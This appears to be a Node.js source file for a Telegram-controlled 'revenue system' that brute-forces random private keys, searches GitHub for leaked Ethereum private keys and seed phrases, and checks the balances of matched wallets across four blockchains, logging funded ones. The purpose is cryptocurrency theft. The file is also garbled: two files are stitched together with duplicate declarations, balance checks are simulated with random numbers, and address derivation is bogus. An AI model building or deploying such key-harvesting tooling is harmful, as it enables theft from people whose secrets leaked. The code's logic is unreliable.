const crypto = require('crypto');
const https = require('https');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');

// Health server components
let healthServer;
let serverReady = false;

function createHealthHandler(req, res) {
    const timestamp = new Date().toISOString();
    const remoteAddr = req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
    
    console.log(`[${timestamp}] Health check request: ${req.method} ${req.url} from ${remoteAddr}`);
    
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'close');
    
    const healthData = {
        status: 'healthy',
        timestamp: timestamp,
        service: 'ghostline-revenue-system',
        version: '3.0.0',
        uptime: process.uptime(),
        ready: serverReady
    };
    
    if (req.method === 'GET' && (req.url === '/health' || req.url === '/healthz' || req.url === '/' || req.url === '/ready')) {
        res.writeHead(200);
        res.end(JSON.stringify(healthData));
    } else if (req.method === 'HEAD' && (req.url === '/health' || req.url === '/')) {
        res.writeHead(200);
        res.end();
    } else {
        res.writeHead(404);
        res.end(JSON.stringify({ error: 'Not Found', path: req.url }));
    }
}

function initializeHealthServer() {
    const port = process.env.PORT || 3000;
    const host = '0.0.0.0';
    
    console.log(`[${new Date().toISOString()}] Initializing health server on ${host}:${port}`);
    
    healthServer = http.createServer(createHealthHandler);
    
    healthServer.on('error', (error) => {
        console.error(`[${new Date().toISOString()}] Health server error:`, error);
        if (error.code === 'EADDRINUSE') {
            console.error(`[${new Date().toISOString()}] Port ${port} is in use, attempting fallback`);
            attemptFallbackBinding();
        }
    });
    
    healthServer.on('listening', () => {
        const addr = healthServer.address();
        serverReady = true;
        console.log(`[${new Date().toISOString()}] Health server ready on ${addr.address}:${addr.port}`);
    });
    
    try {
        healthServer.listen(port, host);
    } catch (error) {
        console.error(`[${new Date().toISOString()}] Failed to bind to ${host}:${port}`, error);
        attemptFallbackBinding();
    }
}

function attemptFallbackBinding() {
    const fallbackPorts = [process.env.PORT || 3000, 8080, 5000, 4000];
    
    for (const port of fallbackPorts) {
        try {
            if (healthServer) healthServer.close();
            
            healthServer = http.createServer(createHealthHandler);
            healthServer.listen(port, '0.0.0.0', () => {
                const addr = healthServer.address();
                serverReady = true;
                console.log(`[${new Date().toISOString()}] Fallback binding successful on ${addr.address}:${addr.port}`);
            });
            return;
        } catch (error) {
            console.error(`[${new Date().toISOString()}] Fallback binding failed for port ${port}`, error.message);
        }
    }
}

// Integrated Hunter Agent
class IntegratedHunter {
    constructor() {
        this.name = 'IntegratedHunter';
        this.isRunning = false;
        this.scanInterval = 300000; // 5 minutes
        this.intervalId = null;
        this.startTime = null;
        
        this.metrics = {
            keysGenerated: 0,
            balancesChecked: 0,
            positiveHits: 0,
            errors: 0,
            lastScanTime: null,
            scanCycles: 0
        };
        
        this.rateLimitDelay = 2000;
        this.maxKeysPerCycle = 50;
    }

    async start() {
        if (this.isRunning) return { success: false, message: 'Hunter is already running' };

        this.isRunning = true;
        this.startTime = new Date();
        
        await this.executeScanCycle();
        
        this.intervalId = setInterval(async () => {
            if (this.isRunning) await this.executeScanCycle();
        }, this.scanInterval);

        return { success: true, message: '🎯 Hunter activated successfully' };
    }

    async stop() {
        if (!this.isRunning) return { success: false, message: 'Hunter is not running' };

        this.isRunning = false;
        if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
        }

        return { success: true, message: '⏹️ Hunter stopped successfully' };
    }

    async executeScanCycle() {
        this.metrics.scanCycles++;
        this.metrics.lastScanTime = new Date();
        
        try {
            for (let i = 0; i < this.maxKeysPerCycle; i++) {
                if (!this.isRunning) break;
                
                await this.processRandomKey();
                if (i < this.maxKeysPerCycle - 1) {
                    await this.sleep(this.rateLimitDelay);
                }
            }
        } catch (error) {
            this.metrics.errors++;
        }
    }

    async processRandomKey() {
        try {
            const keyData = this.generateRandomKeyData();
            this.metrics.keysGenerated++;
            
            const balance = await this.checkBalance(keyData.address);
            this.metrics.balancesChecked++;
            
            if (balance > 0) {
                this.metrics.positiveHits++;
                await this.handlePositiveBalance(keyData, balance);
            }
        } catch (error) {
            this.metrics.errors++;
        }
    }

    generateRandomKeyData() {
        const privateKeyBuffer = crypto.randomBytes(32);
        const privateKey = '0x' + privateKeyBuffer.toString('hex');
        const address = this.privateKeyToAddress(privateKey);
        
        return { privateKey, address, timestamp: new Date().toISOString() };
    }

    privateKeyToAddress(privateKey) {
        const hash = crypto.createHash('sha256').update(privateKey).digest('hex');
        return '0x' + hash.slice(-40);
    }

    async checkBalance(address) {
        return new Promise((resolve) => {
            setTimeout(() => {
                const randomBalance = Math.random();
                resolve(randomBalance < 0.999 ? 0 : Math.random() * 10);
            }, 100);
        });
    }

    async handlePositiveBalance(keyData, balance) {
        console.log(`[${new Date().toISOString()}] [HUNTER] Positive balance found: ${keyData.address} - ${balance} ETH`);
    }

    getStatus() {
        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
        const hours = Math.floor(runtime / 3600000);
        const minutes = Math.floor((runtime % 3600000) / 60000);
        
        return {
            isRunning: this.isRunning,
            runtime: `${hours}h ${minutes}m`,
            metrics: this.metrics
        };
    }

    getMetrics() {
        return {
            ...this.metrics,
            successRate: this.metrics.balancesChecked > 0 ? 
                (this.metrics.positiveHits / this.metrics.balancesChecked * 100).toFixed(6) + '%' : '0%',
            errorRate: this.metrics.keysGenerated > 0 ? 
                (this.metrics.errors / this.metrics.keysGenerated * 100).toFixed(2) + '%' : '0%'
        };
    }

    sleep(milliseconds) {
        return new Promise(resolve => setTimeout(resolve, milliseconds));
    }
}

// Integrated Scavenger Agent
class IntegratedScavenger {
    constructor() {
        this.name = 'IntegratedScavenger';
        this.isRunning = false;
        this.scanInterval = 600000; // 10 minutes
        this.intervalId = null;
        this.startTime = null;
        
        this.counters = {
            sourcesScanned: 0,
            matchesFound: 0,
            privateKeysFound: 0,
            mnemonicsFound: 0,
            walletJsonFound: 0,
            errors: 0,
            lastScanTime: null,
            scanCycles: 0
        };
        
        this.sourceUrls = [
            'https://api.github.com/search/code?q=private+key+ethereum',
            'https://api.github.com/search/code?q=mnemonic+seed+phrase',
            'https://api.github.com/search/repositories?q=wallet+backup'
        ];
        
        this.patterns = {
            privateKey: {
                regex: /(?:private[_\s]*key|privateKey)['\"\s:=]*([a-fA-F0-9]{64})/gi,
                validator: this.validatePrivateKey.bind(this)
            },
            ethAddress: {
                regex: /0x[a-fA-F0-9]{40}/gi,
                validator: this.validateEthereumAddress.bind(this)
            },
            mnemonic: {
                regex: /((?:\w+\s+){11,23}\w+)/gi,
                validator: this.validateMnemonic.bind(this)
            }
        };
    }

    async start() {
        if (this.isRunning) return { success: false, message: 'Scavenger is already running' };

        this.isRunning = true;
        this.startTime = new Date();
        
        await this.executeScanCycle();
        
        this.intervalId = setInterval(async () => {
            if (this.isRunning) await this.executeScanCycle();
        }, this.scanInterval);

        return { success: true, message: '🔍 Scavenger activated successfully' };
    }

    async stop() {
        if (!this.isRunning) return { success: false, message: 'Scavenger is not running' };

        this.isRunning = false;
        if (this.intervalId) {
            clearInterval(this.intervalId);
            this.intervalId = null;
        }

        return { success: true, message: '⏹️ Scavenger stopped successfully' };
    }

    async executeScanCycle() {
        this.counters.scanCycles++;
        this.counters.lastScanTime = new Date();
        
        try {
            for (const sourceUrl of this.sourceUrls) {
                if (!this.isRunning) break;
                
                await this.scanSource(sourceUrl);
                await this.sleep(3000);
            }
        } catch (error) {
            this.counters.errors++;
        }
    }

    async scanSource(sourceUrl) {
        try {
            this.counters.sourcesScanned++;
            const content = await this.fetchContent(sourceUrl);
            
            if (content) {
                await this.analyzeContent(content, sourceUrl);
            }
        } catch (error) {
            this.counters.errors++;
        }
    }

    async fetchContent(url) {
        return new Promise((resolve, reject) => {
            const client = url.startsWith('https') ? https : http;
            
            const options = {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (compatible; GhostlineScavenger/3.0)',
                    'Accept': 'application/json, text/plain, */*'
                },
                timeout: 10000
            };
            
            const req = client.get(url, options, (res) => {
                let data = '';
                
                res.on('data', chunk => {
                    data += chunk;
                    if (data.length > 1048576) { // 1MB limit
                        req.destroy();
                        resolve(data);
                    }
                });
                
                res.on('end', () => resolve(data));
            });
            
            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
        });
    }

    async analyzeContent(content, sourceUrl) {
        try {
            for (const [patternName, pattern] of Object.entries(this.patterns)) {
                const matches = content.match(pattern.regex);
                
                if (matches && matches.length > 0) {
                    for (const match of matches) {
                        if (pattern.validator(match)) {
                            this.counters.matchesFound++;
                            await this.handleMatch(patternName, match, sourceUrl);
                        }
                    }
                }
            }
        } catch (error) {
            // Continue processing
        }
    }

    validatePrivateKey(key) {
        const cleaned = key.replace(/[^a-fA-F0-9]/g, '');
        return cleaned.length === 64 && /^[a-fA-F0-9]+$/.test(cleaned);
    }

    validateEthereumAddress(address) {
        return /^0x[a-fA-F0-9]{40}$/.test(address);
    }

    validateMnemonic(phrase) {
        const words = phrase.trim().split(/\s+/);
        return words.length >= 12 && words.length <= 24;
    }

    async handleMatch(patternType, match, sourceUrl) {
        console.log(`[${new Date().toISOString()}] [SCAVENGER] Match found: ${patternType} from ${sourceUrl}`);
        
        switch (patternType) {
            case 'privateKey':
                this.counters.privateKeysFound++;
                break;
            case 'mnemonic':
                this.counters.mnemonicsFound++;
                break;
            case 'walletJson':
                this.counters.walletJsonFound++;
                break;
        }
    }

    getStatus() {
        const runtime = this.startTime ? Date.now() - this.startTime.getTime() : 0;
        const hours = Math.floor(runtime / 3600000);
        const minutes = Math.floor((runtime % 3600000) / 60000);
        
        return {
            isRunning: this.isRunning,
            runtime: `${hours}h ${minutes}m`,
            counters: this.counters
        };
    }

    sleep(milliseconds) {
        return new Promise(resolve => setTimeout(resolve, milliseconds));
    }
}

const crypto = require('crypto');
const https = require('https');

class MultiChainValidator {
    constructor(options = {}) {
        this.name = 'MultiChainValidator';
        this.version = '1.0.0';
        this.isRunning = false;
        
        // API Configuration
        this.apiKeys = {
            ethereum: process.env.ETHERSCAN_API_KEY || '',
            bitcoin: process.env.BLOCKCHAIR_API_KEY || '',
            polygon: process.env.POLYGONSCAN_API_KEY || '',
            binance: process.env.BSCSCAN_API_KEY || ''
        };
        
        // Rate limiting configuration
        this.rateLimits = {
            ethereum: 5000, // 5 seconds between requests
            bitcoin: 3000,
            polygon: 4000,
            binance: 3000
        };
        
        // Validation metrics
        this.metrics = {
            totalValidations: 0,
            validWallets: 0,
            emptyWallets: 0,
            errors: 0,
            totalValue: 0,
            lastValidation: null,
            validationsByChain: {
                ethereum: 0,
                bitcoin: 0,
                polygon: 0,
                binance: 0
            }
        };
        
        // Minimum balance thresholds (in USD equivalent)
        this.minBalanceThresholds = {
            ethereum: 10, // $10 minimum ETH value
            bitcoin: 50,  // $50 minimum BTC value
            polygon: 5,   // $5 minimum MATIC value
            binance: 10   // $10 minimum BNB value
        };
        
        this.log('MultiChainValidator initialized for comprehensive asset verification');
    }

    log(message) {
        const timestamp = new Date().toISOString();
        console.log(`[${timestamp}] [VALIDATOR] ${message}`);
    }

    async validatePrivateKey(privateKey, address = null) {
        this.metrics.totalValidations++;
        this.metrics.lastValidation = new Date();
        
        try {
            // Generate address from private key if not provided
            if (!address) {
                address = this.deriveEthereumAddress(privateKey);
            }
            
            const validationResults = {
                privateKey: this.maskPrivateKey(privateKey),
                address: address,
                chains: {},
                totalValue: 0,
                isValid: false,
                timestamp: new Date().toISOString()
            };
            
            // Validate across multiple chains
            const chainValidations = await Promise.allSettled([
                this.validateEthereumAddress(address),
                this.validateBitcoinAddress(this.deriveBitcoinAddress(privateKey)),
                this.validatePolygonAddress(address),
                this.validateBinanceAddress(address)
            ]);
            
            // Process results
            const chains = ['ethereum', 'bitcoin', 'polygon', 'binance'];
            chainValidations.forEach((result, index) => {
                const chainName = chains[index];
                
                if (result.status === 'fulfilled' && result.value) {
                    validationResults.chains[chainName] = result.value;
                    validationResults.totalValue += result.value.balance || 0;
                    this.metrics.validationsByChain[chainName]++;
                } else {
                    validationResults.chains[chainName] = {
                        balance: 0,
                        error: result.reason?.message || 'Unknown error'
                    };
                }
            });
            
            // Determine if wallet has sufficient value
            validationResults.isValid = validationResults.totalValue > 0;
            
            if (validationResults.isValid) {
                this.metrics.validWallets++;
                this.metrics.totalValue += validationResults.totalValue;
                await this.handleValidWallet(validationResults);
            } else {
                this.metrics.emptyWallets++;
            }
            
            return validationResults;
            
        } catch (error) {
            this.metrics.errors++;
            this.log(`Validation error for ${this.maskPrivateKey(privateKey)}: ${error.message}`);
            return {
                privateKey: this.maskPrivateKey(privateKey),
                error: error.message,
                isValid: false,
                timestamp: new Date().toISOString()
            };
        }
    }

    async validateEthereumAddress(address) {
        await this.sleep(this.rateLimits.ethereum);
        
        return new Promise((resolve, reject) => {
            const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${this.apiKeys.ethereum}`;
            
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.status === '1') {
                            const balanceWei = BigInt(response.result);
                            const balanceEth = Number(balanceWei) / Math.pow(10, 18);
                            
                            resolve({
                                balance: balanceEth,
                                balanceUSD: balanceEth * 2000, // Approximate ETH price
                                currency: 'ETH',
                                network: 'Ethereum'
                            });
                        } else {
                            resolve({ balance: 0, currency: 'ETH', network: 'Ethereum' });
                        }
                    } catch (error) {
                        reject(error);
                    }
                });
            }).on('error', reject);
        });
    }

    async validateBitcoinAddress(address) {
        await this.sleep(this.rateLimits.bitcoin);
        
        return new Promise((resolve, reject) => {
            const url = `https://api.blockchair.com/bitcoin/dashboards/address/${address}`;
            
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.data && response.data[address]) {
                            const balanceSatoshi = response.data[address].address.balance;
                            const balanceBTC = balanceSatoshi / 100000000;
                            
                            resolve({
                                balance: balanceBTC,
                                balanceUSD: balanceBTC * 45000, // Approximate BTC price
                                currency: 'BTC',
                                network: 'Bitcoin'
                            });
                        } else {
                            resolve({ balance: 0, currency: 'BTC', network: 'Bitcoin' });
                        }
                    } catch (error) {
                        reject(error);
                    }
                });
            }).on('error', reject);
        });
    }

    async validatePolygonAddress(address) {
        await this.sleep(this.rateLimits.polygon);
        
        return new Promise((resolve, reject) => {
            const url = `https://api.polygonscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${this.apiKeys.polygon}`;
            
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.status === '1') {
                            const balanceWei = BigInt(response.result);
                            const balanceMatic = Number(balanceWei) / Math.pow(10, 18);
                            
                            resolve({
                                balance: balanceMatic,
                                balanceUSD: balanceMatic * 0.8, // Approximate MATIC price
                                currency: 'MATIC',
                                network: 'Polygon'
                            });
                        } else {
                            resolve({ balance: 0, currency: 'MATIC', network: 'Polygon' });
                        }
                    } catch (error) {
                        reject(error);
                    }
                });
            }).on('error', reject);
        });
    }

    async validateBinanceAddress(address) {
        await this.sleep(this.rateLimits.binance);
        
        return new Promise((resolve, reject) => {
            const url = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${this.apiKeys.binance}`;
            
            https.get(url, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.status === '1') {
                            const balanceWei = BigInt(response.result);
                            const balanceBNB = Number(balanceWei) / Math.pow(10, 18);
                            
                            resolve({
                                balance: balanceBNB,
                                balanceUSD: balanceBNB * 300, // Approximate BNB price
                                currency: 'BNB',
                                network: 'Binance Smart Chain'
                            });
                        } else {
                            resolve({ balance: 0, currency: 'BNB', network: 'Binance Smart Chain' });
                        }
                    } catch (error) {
                        reject(error);
                    }
                });
            }).on('error', reject);
        });
    }

    deriveEthereumAddress(privateKey) {
        // Simplified address derivation for demonstration
        // In production, use proper secp256k1 curve calculations
        const hash = crypto.createHash('keccak256').update(privateKey).digest('hex');
        return '0x' + hash.slice(-40);
    }

    deriveBitcoinAddress(privateKey) {
        // Simplified Bitcoin address derivation for demonstration
        // In production, implement proper Bitcoin address generation
        const hash = crypto.createHash('sha256').update(privateKey + 'bitcoin').digest('hex');
        return '1' + hash.slice(0, 33); // Simplified format
    }

    async handleValidWallet(validationResults) {
        this.log(`Valid wallet discovered: ${validationResults.address} - Total value: $${validationResults.totalValue.toFixed(2)}`);
        
        // Log to secure discovery file
        await this.logValidDiscovery(validationResults);
        
        // Trigger notification if configured
        if (this.notificationCallback) {
            await this.notificationCallback(validationResults);
        }
    }

    async logValidDiscovery(discovery) {
        try {
            const fs = require('fs').promises;
            const logEntry = {
                timestamp: discovery.timestamp,
                address: discovery.address,
                totalValue: discovery.totalValue,
                chains: Object.keys(discovery.chains).filter(chain => 
                    discovery.chains[chain].balance > 0
                ),
                // Private key hash for reference without exposure
                keyHash: crypto.createHash('sha256').update(discovery.privateKey).digest('hex').substring(0, 16)
            };
            
            const logFile = './valid_wallets.json';
            let discoveries = [];
            
            try {
                const existingData = await fs.readFile(logFile, 'utf8');
                discoveries = JSON.parse(existingData);
            } catch (error) {
                // File doesn't exist, start with empty array
            }
            
            discoveries.push(logEntry);
            await fs.writeFile(logFile, JSON.stringify(discoveries, null, 2));
            
        } catch (error) {
            this.log(`Discovery logging error: ${error.message}`);
        }
    }

    maskPrivateKey(privateKey) {
        if (privateKey.length > 16) {
            return privateKey.substring(0, 8) + '...' + privateKey.substring(privateKey.length - 8);
        }
        return '***masked***';
    }

    getMetrics() {
        const successRate = this.metrics.totalValidations > 0 ? 
            (this.metrics.validWallets / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';
        
        const errorRate = this.metrics.totalValidations > 0 ? 
            (this.metrics.errors / this.metrics.totalValidations * 100).toFixed(2) + '%' : '0%';

        return {
            ...this.metrics,
            successRate,
            errorRate,
            averageValue: this.metrics.validWallets > 0 ? 
                (this.metrics.totalValue / this.metrics.validWallets).toFixed(2) : 0
        };
    }

    setNotificationCallback(callback) {
        this.notificationCallback = callback;
    }

    sleep(milliseconds) {
        return new Promise(resolve => setTimeout(resolve, milliseconds));
    }
}

module.exports = MultiChainValidator;

// Main Revenue System
class GhostlineRevenueSystem {
    constructor() {
        this.isRunning = false;
        this.startTime = null;
        
        // Initialize integrated agents
        this.hunter = new IntegratedHunter();
        this.scavenger = new IntegratedScavenger();
        
        this.log('Ghostline Revenue System v3.0 initialized');
        
        // Initialize Telegram bot if token is available
        if (process.env.TELEGRAM_TOKEN) {
            this.initializeTelegramBot();
        }
    }

    log(message) {
        console.log(`[${new Date().toISOString()}] [SYSTEM] ${message}`);
    }

    initializeTelegramBot() {
        this.bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
        
        // Primary system control commands
        this.bot.onText(/\/start/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                const hunterResult = await this.hunter.start();
                const scavengerResult = await this.scavenger.start();
                
                this.bot.sendMessage(chatId, '🚀 Revenue system activated\n\nAll scanning agents operational');
            } catch (error) {
                this.bot.sendMessage(chatId, `System startup error: ${error.message}`);
            }
        });

        this.bot.onText(/\/stop/, async (msg) => {
            const chatId = msg.chat.id;
            try {
                await this.hunter.stop();
                await this.scavenger.stop();
                
                this.bot.sendMessage(chatId, '⏹️ Revenue system deactivated\n\nAll scanning operations halted');
            } catch (error) {
                this.bot.sendMessage(chatId, `System shutdown error: ${error.message}`);
            }
        });

        this.bot.onText(/\/status/, async (msg) => {
            const chatId = msg.chat.id;
            const status = this.getOperationalStatus();
            this.bot.sendMessage(chatId, status);
        });

        this.bot.onText(/\/metrics/, async (msg) => {
            const chatId = msg.chat.id;
            const metrics = this.getPerformanceMetrics();
            this.bot.sendMessage(chatId, metrics);
        });

        // Error handling
        this.bot.on('error', (error) => {
            this.log(`Telegram bot error: ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            this.log(`Telegram polling error: ${error.message}`);
        });
        
        this.log('Telegram bot initialized with streamlined interface');
    }

    getOperationalStatus() {
        const hunterStatus = this.hunter.getStatus();
        const scavengerStatus = this.scavenger.getStatus();
        
        let status = '💰 Revenue System Status\n\n';
        
        if (hunterStatus.isRunning && scavengerStatus.isRunning) {
            status += '🟢 FULLY OPERATIONAL\n\n';
        } else if (hunterStatus.isRunning || scavengerStatus.isRunning) {
            status += '🟡 PARTIAL OPERATION\n\n';
        } else {
            status += '🔴 INACTIVE\n\n';
        }
        
        status += `Scanner: ${hunterStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n`;
        status += `Collector: ${scavengerStatus.isRunning ? 'ACTIVE' : 'INACTIVE'}\n\n`;
        
        if (!hunterStatus.isRunning && !scavengerStatus.isRunning) {
            status += 'Use /start to begin revenue operations';
        } else {
            status += 'Use /metrics for performance data';
        }
        
        return status;
    }

    getPerformanceMetrics() {
        const hunterStatus = this.hunter.getStatus();
        const hunterMetrics = this.hunter.getMetrics();
        const scavengerStatus = this.scavenger.getStatus();
        
        let metrics = '📊 Performance Metrics\n\n';
        
        if (hunterStatus.isRunning) {
            metrics += `🎯 Scanner Performance\n`;
            metrics += `• Runtime: ${hunterStatus.runtime}\n`;
            metrics += `• Keys Generated: ${hunterMetrics.keysGenerated}\n`;
            metrics += `• Balances Checked: ${hunterMetrics.balancesChecked}\n`;
            metrics += `• Positive Hits: ${hunterMetrics.positiveHits}\n`;
            metrics += `• Success Rate: ${hunterMetrics.successRate}\n\n`;
        }
        
        if (scavengerStatus.isRunning) {
            metrics += `🔍 Collector Performance\n`;
            metrics += `• Runtime: ${scavengerStatus.runtime}\n`;
            metrics += `• Sources Scanned: ${scavengerStatus.counters.sourcesScanned}\n`;
            metrics += `• Matches Found: ${scavengerStatus.counters.matchesFound}\n`;
            metrics += `• Private Keys: ${scavengerStatus.counters.privateKeysFound}\n`;
            metrics += `• Mnemonics Found: ${scavengerStatus.counters.mnemonicsFound}\n\n`;
        }
        
        if (!hunterStatus.isRunning && !scavengerStatus.isRunning) {
            metrics += 'No active operations to report\n\nUse /start to begin scanning';
        }
        
        return metrics;
    }

    async start() {
        if (this.isRunning) {
            this.log('Revenue system is already running');
            return;
        }

        this.isRunning = true;
        this.startTime = new Date();
        
        // Initialize health server
        if (!healthServer) {
            initializeHealthServer();
        }
        
        this.log('Ghostline Revenue System started successfully');
    }

    async stop() {
        if (!this.isRunning) {
            this.log('Revenue system is not running');
            return;
        }

        this.isRunning = false;
        
        // Stop all agents
        await this.hunter.stop();
        await this.scavenger.stop();
        
        this.log('Ghostline Revenue System stopped');
    }
}

// Initialize and start the revenue system
const revenueSystem = new GhostlineRevenueSystem();
revenueSystem.start().catch(error => {
    console.error('Failed to start Ghostline Revenue System:', error);
    process.exit(1);
});

// Graceful shutdown handling
process.on('SIGINT', async () => {
    console.log('\nReceived SIGINT, shutting down gracefully...');
    await revenueSystem.stop();
    
    if (healthServer) {
        healthServer.close(() => {
            console.log('Health server closed');
            process.exit(0);
        });
    } else {
        process.exit(0);
    }
});

process.on('SIGTERM', async () => {
    console.log('Received SIGTERM, shutting down gracefully...');
    await revenueSystem.stop();
    
    if (healthServer) {
        healthServer.close(() => {
            console.log('Health server closed');
            process.exit(0);
        });
    } else {
        process.exit(0);
    }
});

module.exports = GhostlineRevenueSystem;  
